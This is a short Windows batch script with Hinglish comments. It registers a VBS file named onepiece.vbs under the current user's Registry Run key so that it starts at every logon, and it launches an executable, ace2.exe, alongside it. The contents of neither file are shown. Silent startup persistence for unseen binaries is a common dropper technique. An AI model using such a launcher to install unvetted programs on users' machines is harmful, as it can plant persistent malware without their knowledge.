@echo off
REM Batch file ko run karne ka path store karna
set scriptPath=%~dp0onepiece.vbs

REM Check if onepiece.vbs exists
if not exist "%scriptPath%" (
    echo Error: onepiece.vbs not found in the current directory.
    exit /b
)

REM Check if ace2.exe exists
if not exist "%~dp0ace2.exe" (
    echo Error: ace2.exe not found in the current directory.
    exit /b
)

REM Registry entry check
REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OnePiece >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo OnePiece registry entry already exists. Skipping registry addition.
) else (
    REM Registry entry banane ka code jo onepiece.vbs ko startup me register karega
    REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OnePiece /t REG_SZ /d "wscript.exe \"%scriptPath%\"" /f
    if %ERRORLEVEL% EQU 0 (
        echo Successfully added OnePiece to registry for startup.
    ) else (
        echo Failed to add OnePiece to registry.
        exit /b
    )
)

REM ace2.exe ko run karne ka code
start "" "%~dp0ace2.exe"

REM Agar onepiece.vbs file ko execute bhi karana hai
wscript.exe "%scriptPath%"
